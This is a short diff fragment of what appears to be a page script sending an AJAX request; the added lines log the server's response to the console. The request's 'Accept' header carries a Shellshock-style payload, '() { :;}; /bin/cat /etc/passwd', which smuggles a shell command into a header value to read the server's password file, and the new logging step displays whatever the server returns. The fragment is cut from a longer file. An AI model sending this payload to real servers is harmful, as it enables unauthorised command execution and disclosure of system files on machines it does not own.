@@ -30,6 +30,8 @@
         headers: {
           'Accept': '() { :;}; /bin/cat /etc/passwd'
         }
+      }).done(function(data) {
+        console.log(data);
       });
     });
     </script>
